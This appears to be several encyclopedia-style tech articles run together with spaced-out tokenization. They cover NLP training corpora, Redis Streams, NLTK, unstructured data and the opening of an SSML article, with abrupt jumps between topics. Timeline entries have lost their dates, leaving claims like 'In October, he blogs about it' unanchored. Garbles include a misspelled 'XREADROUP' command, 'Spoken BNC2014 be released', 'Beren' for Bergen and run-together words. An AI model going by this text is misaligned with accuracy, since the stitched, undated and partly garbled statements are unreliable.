For discourse or text summarization tasks , annotations aid coreference resolutions .
For instance , the British Component of the International Corpus of English ( ICE - GB ) of 1 million words is POS tagged and syntactically parsed .
Another parsed corpus in Penn Treebank .
While WordNet and FrameNet are not corpora , they contain useful semantic information .
Audio / video recordings are transcribed and annotated as well .
The annotations are phonetic ( sounds ) , prosodic ( variations ) , or interactional .
Video transcripts may annotate for sign language and gestures .
Annotations could be inline / embedded with the text .
When they appear on separate lines , it 's called multi - tiered annotation .
If they 're in separate files , and linked to the text via hypertext , it 's called standalone annotation .
What are some NLP task - specific training corpora ?
Example questions and answers from SQuAD .
Source : SQuAD 2019b .
Here are some task - specific corpora : POS Tagging : Penn Treebank 's WSJ section is tagged with a 45-tag tagset .
Use Ritter dataset for social media content .
Named Entity Recognition : CoNLL 2003 NER task is newswire content from Reuters RCV1 corpus .
It considers four entity types .
WNUT 2017 Emerging Entities task and OntoNotes 5.0 are other datasets .
Constituency Parsing : Penn Treebank 's WSJ section has a dataset for this purpose .
Semantic role labelling : OntoNotes v5.0 is useful due to syntactic and semantic annotations .
Sentiment Analysis : IMDb has released 50 K movie reviews .
Others are Amazon Customer Reviews of 130 million reviews , 6.7 million business reviews from Yelp , and Sentiment140 of 160 K tweets .
Text Classification / Clustering : Reuters-21578 is a collection of news documents from 1987 indexed by categories .
20 Newsgroups is another dataset of about 20 K documents from 20 newsgroups .
Question Answering : Stanford Question Answering Dataset ( SQuAD ) is a reading comprehension dataset with 100 K questions plus 50 K unanswerable questions .
The Jeopardy dataset of about 200 K Q&A is another example .
Could you list some NLP text corpora by genre ?
The formal genre is typically from books and academic journals .
Examples are Project Gutenberg EBooks , Google Books Ngrams , and arXiv Bulk Data Access .
There are many text corpora from newswires .
Examples are 20 Newsgroups and Reuters-21578 .
For informal genres , we can include web data and emails .
Corpora for these include Common Crawl , Blogger Corpus , Wikipedia Links Data , Enron Emails , and UCI 's Spambase .
Corpora derived from reviews include Yelp Reviews , Amazon Customer Reviews , and IMDb Movie Reviews .
Even more informal are SMS and tweets , for which we have Sentiment140 , Twitter US Airline Sentiment , and SMS Spam Collection .
Spoken language is often different from written language .
2000 HUB5 English is a dataset that 's a transcription of 40 telephone conversations .
Signed language can also be annotated and transcribed to create a corpus .
Since languages evolve , when analyzing old text , our models need to be trained likewise .
Examples include DOE Corpus ( 600s-1150s ) , and COHA ( 1810s-2000s ) .
Another special case is of learners who are likely to express ideas differently .
The Open Cambridge Learner Corpus contains 10 K student responses of 2.9 million words .
It 's also common to have domain - specific corpora .
For example , BioCreative and GENIA are for biology .
What are some generic training corpora for NLP ?
Some of the well - known corpora are Brown Corpus , British National Corpus ( BNC ) , Lancaster - Oslo / Beren Corpus ( LOB ) , International Corpus of English ( ICE ) , Corpus of Contemporary American English ( COCA ) , Google Books , Ngram Corpus , Penn Treebank-3 , English Gigaword Fifth Edition , and OntoNotes Release 5.0 .
Wikipedia was not made for training NLP models , but it can be used .
We would need to strip markup .
The Gensim Python package has ` gensim.corpora.wikicorpus .
WikiCorpus ` class to process Wikipedia data .
Generic corpora are usually suited for language modelling , which is useful for other downstream tasks such as machine translation and speech recognition .
Researchers have suggested using Project Gutenberg EBooks ; Penn Treebank of about a million words pre - processed by Mikolov et al .
in 2011 ; WikiText-2 of more than 2 million words ; and WikiText-103 .
Google 's one - billion word corpus provides a useful benchmark .
Derived from text corpus , which datasets are useful for NLP tasks ?
Wordlists such as lists of names or stopwords are useful for NLP work .
Phrases in English ( PIE ) is another resource to explore the distribution of words and phrases .
It 's based on the BNC corpus .
Tagsets are essential for POS tagging , chunking , dependency parsing or constituency parsing .
The DKPro Core Tagset Reference is an excellent resource .
The University of Lancaster maintains a multilingual semantic tagset .
Treebanks go beyond just POS - tagging a corpus .
A treebank is an annotated corpus in which the grammatical structure is typically represented as a tree structure .
Examples are Penn Treebank and CHRISTINE Corpus .
Treebanks are useful for evaluating syntactic parsers or as resources for ML models to optimize linguistic analyzers .
Word embeddings are real - valued vectors representations of words .
These have improved many NLP tasks , including language modelling and semantic analysis .
While it 's possible to learn embeddings from a large corpus , it 's easier to start with downloadable embeddings .
Two sources for downloads are Polyglot and the Nordic Language Processing Laboratory ( NLPL ) .
Perhaps by 2020 , we 'll be able to download pretrained language models and apply them to a variety of NLP tasks .
Which are some corpora for non - English languages ?
For machine translation , it 's common to have parallel corpus , that is , aligned text in multiple languages .
We mention a few examples : Aligned Hansards of the 36th Parliament of Canada containing 1.3 million pairs of aligned text segments in English and French Europarl parallel corpus from 1996 - 2011 of 21 European languages from parliament proceedings WMT 2014 EN - DE and WMT 2014 EN - FR A corpus using Wikipedia across 20 languages , 36 bitexts , about 610 million tokens and 26 million sentence fragments An excellent source is OPUS , the open parallel corpus .
Lionbridge published a list of parallel corpora in 2019 .
Martin Weisser maintains a list that links to many non - English corpora .
Are there curated lists of datasets for NLP work ?
A simple web search will yield plenty of relevant results .
Some include download links to the sources .
We mention a few that stand out : The Linguistic Data Consortium has a list of corpora grouped by project . English Corpora hosts nine large corpora The Stanford NLP Group has shared a list of corpora and treebanks Registry of Open Data on AWS stores some NLP - specific datasets NLP datasets at fast.ai is actually stored on Amazon S3 Shared by users , data.world lists 30 + NLP datasets Shared by users , Kaggle list wordlists , embeddings and text corpora Nicolas Iderhoff 's list of NLP datasets includes collection dates and dataset sizes Sebastian Ruder tracks NLP progress , organized by tasks , with links to external datasets Martin Weisser maintains a list of historical and diachronic corpora In NLTK Python code , call ` nltk.download ( ) ` but we can download them separately as well From blogs , three separate lists are from Cambridge Spark , Lionbridge and Open Data Science Where can I download text corpora for training NLP models ?
These are the download links for some notable text corpora : Brown Corpus Corpus of Contemporary American English ( COCA ) Penn Treebank-3 ( paid ) Data dumps of English Wikipedia , Wikipedia Links Data Project Gutenberg EBooks Google Books Ngrams via Google or via Amazon S3 bucket arXiv Bulk Data Access Common Crawl DBpedia 3.5.1 Knowledge Base Amazon Customer Reviews IMDb Reviews Google Blogger Corpus Jeopardy Question - Answer Dataset Yelp Open Dataset Enron Email Dataset 20 Newsgroups Sentiment140 SMS Spam Collection WordNet W. Nelson Francis and Henry Kučera at the Department of Linguistics , Brown University , publish a computer - readable general corpus to aid linguistic research on modern English .
The corpus has 1 million words ( 500 samples of about 2000 words each ) .
Revised editions appeared later in 1971 and 1979 .
Called Brown Corpus , it inspires many other text corpora .
The corpus with annotations is included in Treebank-3 ( 1999 ) .
The Linguistic Data Consortium ( LDC ) was formed to serve as a repository for NLP resources , including corpora .
It 's hosted at the University of Pennsylvania .
BNC is a balanced corpus .
Source : Wikipedia 2019b .
A 100-million corpus of British English called BNC ( British National Corpus ) was assembled between 1991 and 1994 .
It 's balanced across genres .
A follow - up task called BNC2014 was started in 2014 , which can help to understand how language evolves .
Spoken BNC2014 be released in September 2017 .
Written BNC2014 is expected to come out in 2019 .
Penn Treebank-3 has been released .
It 's based upon the original Treebank ( 1992 ) and its revised Treebank II ( 1995 ) .
This work started in 1989 at the University of Pennsylvania .
Treebank-3 includes tagged / parsed Brown Corpus , 1 million words of 1989 WSJ material annotated in Treebank II style , tagged sample of ATIS-3 , and tagged / parsed Switchboard Corpus .
Apart from POS tags , the corpus includes chunk tags , relation tags and anchor tags .
The BLLIP 1987 - 89 WSJ Corpus Release 1 has 30 million words and supplements the WSJ section of Treebank-3 .
Collected for the years 1990 - 2007 , the Corpus of Contemporary American English ( COCA ) is released with 365 million words .
By December 2017 , it has 560 million words , adding 20 million each year .
There 's a good balance of spoken , fiction , popular magazines , newspapers , and academic texts .
It 's been noted that COCA contains many common words that are missing from the American National Corpus ( ANC ) , a corpus of 22 million words .
English Gigaword Fifth Edition is released by LDC .
It comes from seven English newswire services .
It has 4 billion words and takes up 26 gigabytes uncompressed .
The first edition appeared in 2003 .
In November 2012 , researchers at John Hopkins University added syntactic and discourse structure annotations to this corpus after parsing more than 183 million sentences .
From digitized books , Google releases version 2 of Google Books Ngrams .
Version 1 came out in July 2009 .
Only n - grams that appear more than 40 times are included .
The corpus includes 1-gram to 5-grams .
It includes many non - English languages as well .
To experiment on small sets of phrases , researchers can try out the online Google Books Ngram Viewer .
As a corpus for informal genre , English Web Treebank ( EWT ) is released by LDC .
This includes content from weblogs , reviews , question - answers , newsgroups , and email .
It has about 250 K word - level tokens and 16 K sentence - level tokens .
It 's annotated for POS and syntactic structure .
This includes Enron Corporation emails from 1999 - 2002 .
In 2014 , Silveira et al .
provide annotation of syntactic dependencies for this corpus that can be used to train dependency parsers .
Common Crawl publishes 240 TiB of uncompressed data from 2.55 billion web pages .
Of these , 1 billion URLs were not present in previous crawls .
Common Crawl started in 2008 .
In 2013 , they moved from ARC to Web ARChive ( WARC ) file format .
WAT files contain the metadata .
WET files contain plaintext of the WARC files .
Redis Streams is similar to the unified log pattern .
Source : Leach 2017 .
Redis has data types that could be used for events or message sequences , but with different tradeoffs .
Sorted sets are memory hungry .
Clients ca n't block for new messages .
It 's also not a good choice for time series data since entries can be moved around .
Lists do n't offer fan - out : a message is delivered to a single client .
List entries do n't have fixed identifiers .
For 1-to - n workloads , there 's Pub / Sub but this is a " fire - and - forget " mechanism .
Sometimes we wish to keep history , make range queries , or re - fetch messages after a reconnection .
Pub / Sub lacks these properties .
Redis Streams addresses these limitations .
The Stream data type can be seen as similar to logging , except that stream is an abstraction that 's more performant due to logical offsets .
It 's built using radix trees and listpacks , making it space - efficient while also permitting random access by IDs .
What are some use cases for Redis Streams ?
Redis Streams running within a container on a Raspberry Pi .
Source : ApsaraDB 2018 .
Redis Streams is useful for building chat systems , message brokers , queuing systems , event sourcing , etc .
Any system that needs to implement unified logging can use Streams .
Queuing apps such as Celery and Sidekiq could use Streams .
Slack - style chat apps with history can use Streams .
For IoT applications , streams can run on end devices .
This is essentially time - series data that streams timestamps for sequential ordering .
Each IoT device will store data temporarily and asynchronously push it to the cloud via Streams .
While we could use Pub / Sub along with lists and hashes to persist data , Stream is a better data type that 's designed to be more performant .
Also , if we use Pub / Sub and Redis server is restarted , then all clients have to resubscribe to the channel .
Since Streams supports blocking , clients need not poll for new data .
Blocking enables real - time applications , that is , clients can act on new messages as soon as possible .
Which are the new commands introduced by Redis Streams ?
Illustrating the use of some commands of Redis Streams .
Source : Huawei Cloud 2019 , fig .
2 .
All commands of Redis Streams are documented online .
We briefly mention them : Adding : ` XADD ` is the only command for adding data to a stream .
Each entry has a unique ID that enables ordering .
Reading : ` XREAD ` and ` XRANGE ` read items in the order determined by the IDs .
` XREVRANGE ` returns items in reverse order .
` XREAD ` can read from multiple streams and can be called in a blocking manner .
Deleting : ` XDEL ` and ` XTRIM ` can remove data from the stream .
Grouping : ` XGROUP ` is for managing consumer groups .
` XREADROUP ` is a special version of ` XREAD ` with support from consumer groups .
` XACK ` , ` XCLAIM ` and ` XPENDING ` are other commands associated with consumer groups .
Information : ` XINFO ` shows details of streams and consumer groups .
` XLEN ` gives the number of entries in a stream .
What are the main features of Redis Streams ?
Streams is a first - class citizen of Redis .
It benefits from the usual Redis capabilities of persistency , replication and clustering .
It 's stored in memory and under a single key .
The main features of streams are : Asynchronous : Producers and consumers need not be simultaneously connected to the stream .
Consumers can subscribe to streams ( push ) or read periodically ( pull ) .
Blocking : Consumers need not keep polling for new messages .
Capped Streams : Streams can be truncated , keeping only the N most recent messages .
At - Least Once Delivery : This makes the system robust .
Counter : Every pending message has a counter of delivery attempts .
We can use this for dead letter queuing .
Deletion : While events and logs do n't usually have deletion as a feature , Streams supports this efficiently .
Deletion allows us to address privacy or regulatory concerns .
Persistent : Unlike Pub / Sub , messages are persistent .
Since history is saved , a consumer can look at previous messages .
Lookback Queries : This helps consumers analyse past data , such as , obtain temperature readings in a particular 10-second window .
Scale - Out Options : Via consumer groups , we can easily scale out .
Consumers can share the load of processing a fast - incoming data stream .
Could you explain consumer groups in Redis ?
Consumers within a consumer group share the processing load .
Source : Kumar 2018 , fig .
1.3 .
A consumer group allows consumers of that group to share the task of consuming messages from a stream .
Thus , a message in a stream can be consumed by only one consumer in that consumer group .
This relieves the burden on a consumer to process all messages .
Command ` XGROUP ` creates a consumer group .
A consumer is added to a group for the first time . It is called ` XREADGROUP ` .
A consumer always has to identify itself with a unique consumer name .
A stream can have multiple consumer groups .
Each consumer group tracks the ID of the last consumed message .
This ID is shared by all consumers of the group .
Once a consumer reads a message , its ID is added to a Pending Entries List ( PEL ) .
The consumer must acknowledge that it has processed the message , using the ` XACK ` command .
Once acknowledged , the pending list is updated .
Another consumer can claim a pending message using the ` XCLAIM ` command and begin processing it .
This helps in recovering from failures .
However , a consumer can choose to use the ` NOACK ` subcommand of ` XREADGROUP ` if high reliability is not important .
Could you share more details about IDs in Redis Streams ?
Entries within a stream are ordered using IDs .
Each ID has two parts separated by hyphens : UNIX millisecond timestamp followed by sequence number to distinguish entries added at the same millisecond time .
Each part is a 64-bit number .
For example , ` 1526919030474 - 55 ` is a valid ID .
IDs are autogenerated when ` XADD ` command is called .
However , a client can specify its own ID , but it should be an ID greater than all other IDs in the stream .
Incomplete IDs are when the second part is omitted .
With ` XRANGE ` , Redis will fill in a suitable second part for us .
With ` XREAD ` , the second part is always ` -0 ` .
Some IDs are special : ` $ ` : Used with ` XREAD ` to block new messages , ignoring messages already in the stream .
` - ` & ` + ` : Used with ` XRANGE ` , to specify minimum and maximum IDs possible within the stream .
For example , the following command will return every entry in the stream : ` XRANGE mystream - + ` ` > ` : Used with ` XREADGROUP ` , to get new messages ( never delivered to other clients ) .
If this command uses any other ID , it has the effect of returning pending entries of that client .
In what technical aspects do Redis Streams differ from other Redis data types ?
Comparing Redis Stream data type with other types .
Source : Huawei Cloud 2019 , table 2 .
Unlike other Redis blocking commands that specify timeouts in seconds , commands ` XREAD ` and ` XREADGROUP ` specify timeouts in milliseconds .
Another difference is that when blocking on list pop operations , the first client will be served when new data arrives .
With the Stream ` XREAD ` command , every client blocking on the stream will get the new data .
When an aggregate data type is emptied , its key is automatically destroyed .
This is not the case with the Stream data type .
The reason for this is to preserve the state associated with consumer groups .
Stream is not deleted even if there are no consumer groups , but this behaviour may be changed in future versions .
How does Redis Streams compare against Kafka ?
Apache Kafka is a well - known alternative to Redis Streams .
In fact , some features of Streams , such as consumer groups , have been inspired by Kafka .
However , Kafka is said to be difficult to configure and expensive to operate on typical public clouds .
Streams are therefore a better option for small , inexpensive apps .
Could you share some performance numbers on Redis Streams ?
In one test on a two - core machine with multiple producers and consumers , messages were generated at 10 K per second .
With ` COUNT 10000 ` given to the ` XREADGROUP ` command , every iteration processed 10 K messages .
It was seen that 99.9 % of requests had a latency of less than 2 ms .
Real - world performance is expected to be better than this .
When compared against traditional Pub / Sub messaging , Streams gives 100x better throughput .
It 's able to handle more than 1 million operations per second .
If Pub / Sub messages are persisted on network storage , the latency is about 5 ms .
Streams have less than 1 ms latency .
Could you share some developer tips for using Redis Streams ?
There are dozens of Redis clients in various languages .
Many of these have support for Streams .
Use ` XREAD ` for 1-to-1 or 1-to - n messaging .
Use ` XRANGE ` for windowing - based stream processing .
Within a consumer group , if a client fails temporarily , it can reread messages from a specific ID .
For permanent failures , other clients can claim pending messages .
For real - time streaming analytics , one suggestion is to pair Redis Streams with Apache Spark .
The latter has the feature Structured Streaming that pairs up nicely with Streams .
To scale out , multiple Spark jobs can belong to a single consumer group .
Since Streams is persistent , even if a Spark job restarts , it wo n't miss any data since it will start consuming from where it left off .
Salvatore Sanfilippo , creator of Redis , gives a demo of Redis Streams and explains the API .
In October , he blogs about it .
He explains that the idea occurred much earlier .
He tinkered with implementing a generalization of sorted sets and lists but was not happy with the results .
When Redis 4.0 came out with support for modules , Timothy Downs created a data type for logging transactions .
Sanfilippo used this as an inspiration to create Redis Streams .
The first release candidate RC1 of Redis 5.0 is released .
This supports the Stream data type .
The Beta version of Redis Enterprise Software ( RS ) 5.3 has been released .
This is based on Redis 5.0 RC3 with support for Stream data type .
Redis 5.0.0 is released .
At the Redis Conference 2019 , Dan Pipe - Mazo talks about Atom , a microservice SDK powered by Redis Streams .
Microservices interact with one another using Streams .
Typical NLTK pipeline for information extraction .
Source : Bird et al .
2019 , ch .
7 , fig .
7.1 .
Natural Language Toolkit ( NLTK ) is a Python package to perform natural language processing ( NLP ) .
It was created mainly as a tool for learning NLP via a hands - on approach .
It was not designed to be used in production .
The growth of unstructured data via social media , online reviews , blogs , and voice - based human - computer interaction are some reasons why NLP has become important in the late 2010s .
NLTK is a useful toolkit for many of these NLP applications .
NLTK is composed of sub - packages and modules .
A typical processing pipeline will call modules in sequence .
Python data structures are passed from one module to another .
Beyond the algorithms , NLTK gives quick access to many text corpora and datasets .
Which are the fundamental NLP tasks that can be performed using NLTK ?
Pipeline for text classification .
Source : Navlani 2018 , fig .
1 .
NLTK can be used in a wide range of applications for NLP .
For basic understanding , let 's try to analyze a paragraph using NLTK .
It can be pre - processed using sentence segmentation , removing stopwords , removing punctuation and special symbols , and word tokenization .
After pre - processing the corpus , it can be analyzed sentence - wise using parts of speech ( POS ) to extract nouns and adjectives .
Subsequent tasks can include named entity recognition ( NER ) , coreference resolution , constituency parsing and dependency parsing .
The goal is to find insights and context about the corpus .
Further downstream tasks , more pertaining to application areas , could be emotion detection , sentiment analysis or text summarization .
Tasks such as text classification and topic modeling typically require large amounts of text for better results .
Which are the modules available in NLTK ?
NLTK modules with functionalities .
Source : Bird et al .
2019 , ch .
0 , table VIII.1 .
NLTK 's architecture is modular .
Functionality is organized into sub - packages and modules .
NLTK is used for its simplicity , consistency and extensibility of its modules and functions .
It 's better explained in the tabular list of modules .
A complete module index is available as part of NLTK documentation .
How is the NLTK package split into sub - packages and modules ?
Illustrating the organization of the ' text ' sub - package and its modules .
Source : Howard 2016 , fig .
3 .
NLTK is divided into different sub - packages and modules for text analysis using various methods .
The figure depicts an example of a ` text ` sub - package and the modules within it .
Each module fulfils a specific function .
Which are the natural languages supported in NLTK ?
Languages supported by NLTK depend on the task being implemented .
For stemming , we have RSLPStemmer ( Portuguese ) , ISRIStemmer ( Arabic ) , and SnowballStemmer ( Danish , Dutch , English , Finnish , French , German , Hungarian , Italian , Norwegian , Portuguese , Romanian , Russian , Spanish , Swedish ) .
For sentence tokenization , PunktSentenceTokenizer is capable of multilingual processing .
Stopwords are also available in multiple languages .
After importing ` stopwords ` , we can obtain a list of languages by running ` print(stopwords.fileids ( ) ) ` .
Although most taggers in NLTK support only English , the ` nltk.tag.stanford ` module allows us to use StanfordPOSTagger , which has multilingual support .
This is only an interface for the Stanford tagger , which must be run on the machine .
What datasets are available in NLTK for practice ?
The NLTK downloader is a handy interface to manage packages and datasets .
Source : Shetty 2018 .
NLTK corpus is a natural dump for all kinds of NLP datasets that can be used for practice or maybe combined for generating models .
For example , to import the Inaugural Address address , the statement to execute is ` from nltk.corpus import inaugural ` .
Out of dozens of corpora , some popular ones are Brown , Name Genders , Penn Treebank , and Inaugural Address .
NLTK makes it easy to read a corpus via the package ` nltk.corpus ` .
This package has a reader object for each corpus .
What are the disadvantages or limitations of NLTK ?
It 's been mentioned that NLTK is " a complicated solution with a harsh learning curve and a maze of internal limitations " .
For sentence tokenization , NLTK does n't apply semantic analysis .
Unlike Gensim , NLTK lacks neural network models or word embeddings .
NLTK is slow , whereas spaCy is said to be the fastest alternative .
In fact , since NLTK was created for educational purpose , optimized runtime performance was never a goal .
However , it 's possible to speed up execution using Python 's ` multiprocessing ` module .
Matthew Honnibal , the creator of spaCy , noted that NTLK has lots of modules but very few ( tokenization , stemming , visualization ) are actually useful .
Often , NLTK has wrappers to external libraries and this leads to slow execution .
The POS tagger was terrible , until Honnibal 's average perceptron tagger was merged into NLTK in September 2015 .
In general , NLP is evolving so fast that maintainers need to curate often and throw away old things .
For beginners , what are some useful resources to learn NLTK ?
The official website includes documentation , a Wiki , and an index of all modules .
There are Google Groups for users and developers .
For basic usage of NLTK , you can read a tutorial by Bill Chambers .
This also shows some text classification examples using Scikit - learn .
Another basic tutorial from Harry Howard includes examples from the Pattern library as well .
Often specific processing is implemented in external libraries .
Benjamin Bengfort shows in a blog post how to call CoreNLP from inside NLTK for syntactic parsing .
There 's a handy cheat sheet by Murenei .
Another one from 2017 was published at Northwestern University .
A list of recommended NLTK books appears on BookAuthority .
You can start by reading Natural Language Processing with Python ( Bird et al .
2009 ) .
Those who wish to learn via videos can look up a playlist of 21 videos from sentdex .
NLTK 's chart parsing tool is a useful visualization .
Source : Loper and Bird 2002 , fig .
1 .
The first downloadable version of NLTK appears on SourceForge .
Created at the University of Pennsylvania , the aim is to have a set of open source software , tutorials and problem sets to aid the teaching of computational linguistics .
Before NLTK , a project might have required students to learn multiple programming languages and toolkits .
The lack of visualization also made it difficult to have class demonstrations .
NLTK is meant to solve these problems .
NLTK - Lite 0.1 has been released .
Steven Bird , one of the creators of NLTK , explains that NLTK 1.4 introduced Python 's dictionary - based architecture for storing tokens .
This created overhead for programmers .
With NLTK - Lite , programmers can use simpler data structures .
For better performance , iterators are used instead of lists .
Taggers usually backoff by default .
Method names are shorter .
Since then , regular releases have been made until NLTK - Lite 0.9 in October 2007 .
NLTK - Lite eventually became NLTK .
Two NLTK projects have been accepted for Google Summer of Code : dependency parsing and natural language generation .
The dependency parser becomes part of NLTK version 0.9.6 ( December 2008 ) .
A book titled Natural Language Processing with Python by Bird et al .
is published by O'Reilly Media .
Since October 2013 , the authors have released online revised versions of the book updated for Python 3 and NLTK 3 .
Version 2.0.1rc1 becomes the first release available via GitHub , although till July 2014 , releases are also made via SourceForge .
Over a five - year period from January 2008 to July 2013 , NLTK got more than half a million downloads .
This excludes downloads via GitHub .
NLTK 3.0.0 is released , making this the first stable release supporting Python 3 .
The Alpha release , version 3.0a0 ( alpha ) , supporting Python 3 can be traced to January 2013 .
Examples of structured , semi - structured and unstructured data .
Source : Jones 2018 , fig .
2 .
Data is available in many forms , shapes and formats .
Broadly , data can be either structured or unstructured .
Data that 's properly organized , with well - defined constraints and relationships among its different parts , can be considered as structured .
There 's no precise definition of structured data .
In the hazy boundary between structured and unstructured data , some have identified semi - structured data .
Others have argued that all data has some structure : it 's just that some are more difficult to store or analyze .
The general viewpoint is that all data can add value to data mining and analytics .
Technology that has evolved for structured data has been adapted , and new ones invented , to handle unstructured data as well .
Unstructured data has become increasingly important due to its volume , velocity , variety and value .
What do you mean by " structure " with respect to data ?
Structured data is organized as tables , rows , columns and relations .
Source : Pickell 2018 .
Data that 's highly organized , such as in a database , can be considered as structured data .
These often use a Relational Database Management System ( RDBMS ) .
Such data has a schema that defines attributes and their types , constraints on values , and relations with other data tables and attributes .
Data must conform to this schema .
This makes data easy to query using Structured Query Language ( SQL ) and thereby facilitates analysis .
Data in spreadsheets may be considered structured .
Unstructured data is not organized in this manner , that is , in RDBMS .
Consider an audio stream , which has a well - defined format .
Otherwise , it could n't be decoded and played .
Consider newspaper text .
A linguist would say there 's structure .
But from the perspective of business analysts , this data is unstructured simply because it 's harder to analyze and obtain insights .
Some say the term unstructured data is a misnomer .
If it truly lacks structure , it 's useless to store it or analyze it .
It would be better to categorize data as fixed or variable structure ; repetitive or hierarchical ; textual or non - textual .
Could you give examples of unstructured and semi - structured data ?
Once analyzed , an ' unstructured ' image can reveal useful insights .
Source : Johnson 2019 .
Rich media such as images , video or audio are unstructured .
Social media generates lots of unstructured content .
Websites host unstructured content that is commonly textual in nature .
Information in documents such as MS Word files or PDF files is also seen as unstructured .
Machine - generated content such as satellite images , IoT sensor data , or CCTV video fees are considered unstructured .
Many of the same data sources mentioned above could have attributes that make them semi - structured .
For instance , tweets , Facebook posts , blog articles , and news stories published online often have a number of likes , retweets / shares , and comments , including names of readers who did these .
Email text may be unstructured but the header contains names of sender / receiver , date and subject that give some structure .
IoT data may be seen as semi - structured when it 's in JSON or XML formats .
Data about data , called metadata , such as author name and publication date , makes data semi - structured .
In fact , rich semantic markup on webpages gives them a lot more structure than what HTML alone does .
Most unstructured data can be considered as semi - structured because of metadata .
What are some use cases of analysis on unstructured data ?
Keyword trend analysis based on logs and reports .
Source : Min 2017 , fig .
4 .
In a manufacturing plant , operation logs and reports are unstructured .
Text analysis to pick out frequent words or sentiments can help the plant manager make a maintenance plan or quickly understand the nature of a particular line .
Koorong Books in Australia uses text analysis to identify duplicate postings or suggest similar books .
This is an example of content - based profiling .
In banking , customers may often give feedback or complaints on social media rather than via web forms .
If banks wish to be customer centric , they need to act on this unstructured data .
In fact , this could apply to any industry that needs to listen to its customers .
Companies can use chatbots with NLP capability to automate customer support functions .
Deep learning techniques are being used to analyze images and sounds .
Images can be automatically labelled .
Mammograms can be analyzed for cancer .
The sound of a motor can inform you in advance if it 's going to fail .
This is of importance in the automobile and aviation sectors .
What are some myths about unstructured data ?
An early myth was that unstructured data ca n't be quantitatively analyzed .
Perhaps true in the past , but with recent advances in computer vision , speech processing , and natural language processing , algorithms are able to solve many complex problems in these domains .
Some might believe that unstructured data replaces structured data .
In reality , many companies have not fully exploited the potential of structured data .
Good old predictive models and analytical capabilities should continue to be used .
Unstructured data will give access to new insights not otherwise available in structured data .
In conclusion , both structured and unstructured data are valuable .
Another myth says that all big data is unstructured data .
Telecomcompanies,smartenergymeters , smartphones , and cars fitted with sensors are all generating big data that 's structured .
Some businesses just store the data with a vague idea of using it later .
In fact , data and insights depreciate over time .
Real - time dashboards are probably the best opportunity to act on data in a timely manner .
When collecting or acting on data , tie it to a business vision .
How should I store unstructured data ?
Big Data technologies such as Hadoop and NoSQL databases have come about to address the needs of storing and managing unstructured data .
Data warehouses and data lakes are places where big data is stored .
Unstructured data is often used alongside structured data .
Many technologies cater for both .
Hadoop enables distributed storage and computing on big data .
It 's a good engine for handling unstructured data , though it 's a myth to think that unstructured data ca n't be stored or analyzed without Hadoop .
NoSQL databases are highly scalable and support flexible schema .
Their storage is distributed .
They 're non - relational .
They 're good at storing multimedia , social media or textual data .
Among the different types are document stores , column stores , key - value stores and graph data stores .
A mix of these is often used , each suited to a particular data .
This approach is called polyglot persistence .
As the cost of flash memory drops , flash becomes a faster alternative to disk storage .
However , file services such as data protection , backup , and search need to be in place .
For a minimalistic storage system , try the open source MinIO .
Alternatives include Ceph , Scality and Cleversafe .
What are some techniques to analyze unstructured data ?
The general perception is that unstructured data is hard to analyze .
This is changing due to advances in machine learning models .
The simplest way to get started is perhaps to call APIs that others have published .
For example , cognitive APIs from IBM such as Watson Tradeoff Analytics can help in decision making .
Geneea is an NLP API .
For speech recognition , we can use the AT&T Speech API .
Google 's Cloud Vision API is useful for many image - specific tasks .
In the 1960s , businesses started using computers .
Storing and managing data has become important to them .
Because memory is expensive , there 's a need to store data efficiently .
For these reasons , databases were invented .
IBM 's IMS is an example .
These early databases store only structured data .
The 1970s saw the arrival of relational databases .
In 1974 , IBM invented SQL as a language to query such databases .
Andy Rehn , VP of marketing for Data Base Architects , states that " as much as 90 percent of the information business uses is non - numerical , freeform data .
" This is one of the earliest published reports that quantifies the prevalence of unstructured data .
Challenges of extracting information from a scanned PDF document .
Source : Lawtomated 2019 .
The early and mid-1990s is when text mining started entering real - world applications .
Document - management systems emerged , later rebranded as Enterprise Content Management ( ECM ) systems .
The World Wide Web also started generating lots of unstructured data .
Business Intelligence ( BI ) , had grown up on structured data , started mining text for useful insights .
A rule of thumb is that 80 % of all data is unstructured or semi - structured at best .
This 80 % figure is mentioned in a Merrill - Lynch report but it 's not due to primary research .
From a survey involving data warehousing and business intelligence search , TDWI Research finds that the structured / unstructured ratio is not 20/80 as often claimed .
Structured data is at 47 % , unstructured data at 31 % and the rest is semi - structured .
However , the report recognizes that unstructured data is on the rise .
OASIS approves Unstructured Information Management Architecture ( UIMA ) , version 1.0 .
Apache UIMA is an open source implementation of this standard .
V1.0.0 of this software was released in January 2014 .
In August 2019 , V3.1.0 be released .
Analysis of unstructured data is still new in some domains .
A case in point is the healthcare industry where doctors ' handwritten notes , images , histories , formulae and genetics have not been fully analyzed .
Speech synthesis is the process of producing natural - sounding human speech from text so that humans can interact with machines via voice interfaces .
Typical applications are reading for the blind , speaking aids for the handicapped , remote access to email , proofreading and so on .
The speech synthesis system consists of analysis of input text , followed by synthesis of speech .
There are inherent difficulties with these systems .
They do n't handle symbols or foreign words suitably .
Some systems translate leading whitespaces into extra pauses .
Some words may need extra stress or change of pitch .
It 's for these purposes that Speech Synthesis Markup Language ( SSML ) becomes useful .
SSML adds markup on input text to aid speech synthesizers construct speech waveforms that sound more natural .
SSML is a W3C standard , though some implementations have proprietary extensions .
Popular voice assistants ( Alexa , Assistant , Cortana ) are known to use SSML .
Which are the main features of SSML ?
Example of synthesized speech using SSML .
Source : Google Developers 2019 .
SSML has many useful features to make synthesized speech sound more natural : Voice : Different parts of a text can use different voices ( male / female / neutral ) , which is useful for reading out dialogues .
Variations : Some words could be emphasized .
Others could be stretched in time .
Some phrases could be said at a high pitch .
Swear words could be censored .
Special Cases : Telephone numbers could be read out as individual digits .
Date and time fields should not be read out as individual digits .
Abbreviations could be expanded or read out as individual letters .
Pauses : Pauses could be introduced , for example , to suggest the speaker is thinking or expecting a response .
Recording : A recorded audio file can be played , and if unavailable , an alternate text can be synthesized .
Multilingual : A default language could be specified at the root level .
This can be overridden by specific foreign language phrases .
Where does SSML fit in the overall speech synthesis process ?
SSML tags are useful throughout the speech synthesis process .
Source : Baggia and Spa 2019 , fig .
4 .
Most text - to - speech ( TTS ) engines process their input in stages : structure analysis , text normalization , text - to - phoneme conversion , prosody analysis and waveform production .
All of these can be enhanced by SSML elements .
For example , ` p ` and ` s ` SSML elements mark paragraphs and sentences ; ` say - as ` is useful for rendering special cases ; ` sub ` for expanding abbreviations ; and so on .
Text normalization converts text into tokens suitable for speech .
For example , ' $ 200 ' would be converted to ' two hundred dollars ' ; ' 1/2 ' would become ' half ' ; and ' AAA ' would become ' triple A ' .
